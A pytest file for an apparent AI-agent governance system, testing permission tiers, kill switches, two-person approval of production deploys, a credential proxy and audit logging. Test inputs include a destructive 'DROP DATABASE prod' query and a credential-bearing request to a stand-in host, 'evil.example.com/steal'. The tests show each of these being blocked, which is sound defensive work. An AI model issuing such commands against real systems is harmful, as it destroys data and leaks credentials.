"""
Phase 13 — policy, human approvals (two-person rule), grants, the credential
broker / tool gateway, kill switches, and the audit trail.
"""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

pytest.importorskip("bossman")

from bossman import errors  # noqa: E402

from tests.helpers import ADMIN, OPERATOR, http, sdk, server, set_env, until  # noqa: E402


@pytest.fixture(autouse=True)
def env(monkeypatch):
    set_env(monkeypatch, BOSSMAN_PROXY_ALLOW_HTTP="1")


async def test_policy_decisions_tier_capabilities_rules_and_kill_switch():
    async with server() as (app, rt):
        async with sdk(app) as bm:
            async with bm.agent(name="reader", role="analyst", tier="READ_ONLY",
                                capabilities=["sql", "search"]) as agent:
                assert (await agent.authorize("read", tool="sql")).decision == "allow"
                with pytest.raises(errors.PolicyDenied, match="requires WRITE"):
                    await agent.authorize("write", tool="sql")
                with pytest.raises(errors.PolicyDenied, match="capabilities"):
                    await agent.authorize("read", tool="shell")
                async with http(app, OPERATOR) as op:
                    await op.put("/api/flags/tool.search", json={"enabled": False, "note": "vendor outage"})
                with pytest.raises(errors.PolicyDenied, match="kill switch"):
                    await agent.authorize("search", tool="search")
            async with bm.agent(name="dba", role="dba", tier="PRIVILEGED") as dba:
                with pytest.raises(errors.PolicyDenied, match="never allowed"):
                    await dba.authorize("execute", tool="sql", args={"q": "DROP DATABASE prod"})
                with pytest.raises(errors.PolicyDenied, match="justification"):
                    await dba.authorize("delete", tool="sql", args={"q": "DELETE FROM t"})
        entries = await rt.audit.list(kind="policy_decision")
        assert len(entries) >= 6
        assert {e["data"]["decision"]["decision"] for e in entries} == {"allow", "deny"}


async def test_two_person_rule_for_production_changes():
    async with server() as (app, rt):
        async with http(app, ADMIN) as admin:
            second = (await admin.post("/api/keys", json={"name": "bob", "role": "operator"})).json()["key"]
        async with sdk(app) as bm, bm.agent(name="deployer", role="ops", tier="PRIVILEGED") as agent:
            pending = asyncio.create_task(agent.authorize(
                "deploy", tool="kubectl", labels={"env": "production"},
                justification="ship hotfix 1.2.3", wait_for_approval_s=10))
            approvals = []

            async def pending_list():
                approvals[:] = await rt.approvals.list(status="pending")
                return approvals

            assert await until(pending_list, timeout=3)
            ap = approvals[0]
            assert ap["required"] == 2
            async with http(app, OPERATOR) as alice, http(app, second) as bob:
                r1 = (await alice.post(f"/api/approvals/{ap['approval_id']}/approve", json={"reason": "lgtm"})).json()
                assert r1["status"] == "pending"
                again = await alice.post(f"/api/approvals/{ap['approval_id']}/approve", json={})
                assert again.status_code == 409  # one person cannot approve twice
                r2 = (await bob.post(f"/api/approvals/{ap['approval_id']}/approve", json={})).json()
                assert r2["status"] == "approved" and r2["grant_id"]
            auth = await pending
            assert auth.grant_id == r2["grant_id"]


async def test_denied_and_expired_approvals_block_the_agent():
    async with server() as (app, rt):
        async with sdk(app) as bm, bm.agent(name="cleaner", role="ops", tier="PRIVILEGED") as agent:
            pending = asyncio.create_task(agent.authorize("delete", tool="s3", justification="cleanup",
                                                          wait_for_approval_s=10))

            async def first_pending():
                rows = await rt.approvals.list(status="pending")
                return rows[0] if rows else None

            assert await until(first_pending, timeout=3)
            ap = await first_pending()
            async with http(app, OPERATOR) as op:
                await op.post(f"/api/approvals/{ap['approval_id']}/deny", json={"reason": "not today"})
            with pytest.raises(errors.PolicyDenied, match="denied"):
                await pending


async def test_credential_gateway_injects_secret_only_for_allowlisted_hosts():
    seen: list[httpx.Request] = []

    def upstream(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={"ok": True, "auth": request.headers.get("authorization")})

    async with server() as (app, rt):
        app.state.proxy_transport = httpx.MockTransport(upstream)
        async with http(app, ADMIN) as admin:
            r = await admin.put("/api/secrets/github", json={
                "value": "ghp_supersecret", "allowed_hosts": ["api.github.com"], "allowed_tools": ["github"],
                "min_tier": "WRITE"})
            assert r.status_code == 200 and "ghp_supersecret" not in r.text
        # encrypted at rest
        raw = await rt.docs.get("secrets", "github")
        assert "ghp_supersecret" not in json.dumps(raw)

        async with sdk(app) as bm, bm.agent(name="bot", role="dev", tier="WRITE", capabilities=["github"]) as agent:
            auth = await agent.authorize("create", tool="github", credentials=["github"])
            assert auth.credentials["github"]["mode"] == "proxy"
            with pytest.raises(errors.Forbidden):
                auth.secret("github")  # proxy-only: the value never reaches the agent
            res = await agent.proxy(auth, credential="github", method="POST",
                                    url="https://api.github.com/repos/x/y/issues", body={"title": "bug"})
            assert res["status"] == 200 and json.loads(res["text"])["auth"] == "Bearer ghp_supersecret"
            # grants are single-use
            with pytest.raises(errors.Conflict):
                await agent.proxy(auth, credential="github", url="https://api.github.com/x")
            auth2 = await agent.authorize("create", tool="github", credentials=["github"])
            with pytest.raises(errors.Forbidden, match="not allow-listed"):
                await agent.proxy(auth2, credential="github", url="https://evil.example.com/steal")
        assert len(seen) == 1
        kinds = {e["kind"] for e in await rt.audit.list()}
        assert {"credential_release", "proxy_request", "secret_put"} <= kinds


async def test_policy_apply_validation_and_dry_run():
    async with server() as (app, rt):
        async with sdk(app) as bm, bm.agent(name="x", role="ops", tier="WRITE") as agent:
            async with http(app, ADMIN) as admin:
                bad = await admin.put("/api/policies", json={"yaml": "rules: [{name: r, decision: maybe}]"})
                assert bad.status_code == 400
                yaml_text = (await admin.get("/api/policies")).json()["yaml"]
                yaml_text = yaml_text.replace("rules:", "rules:\n- name: no-email\n  match: {tool: email}\n"
                                                        "  decision: deny\n  reason: email is off-limits", 1)
                assert (await admin.put("/api/policies", json={"yaml": yaml_text})).status_code == 200
                dry = (await admin.post("/api/policies/evaluate", json={
                    "agent_id": agent.agent_id, "request": {"action": "send", "tool": "email"}})).json()
                assert dry["decision"] == "deny" and dry["rule"] == "no-email"
            assert rt.policy.revision == 1


async def test_repeated_permission_denials_escalate_and_pause():
    async with server() as (app, rt):
        async with sdk(app) as bm, bm.agent(name="rogue", role="r", tier="READ_ONLY",
                                            heartbeat_interval=0.05) as agent:
            for _ in range(3):
                with pytest.raises(errors.PolicyDenied):
                    await agent.authorize("delete", tool="db", justification="x")
            assert await until(lambda: not agent._running.is_set(), timeout=5)  # paused by BOSSman
            gates = [e for _, e in rt.store.query(event_type="HUMAN_GATE_REQUIRED")]
            assert gates
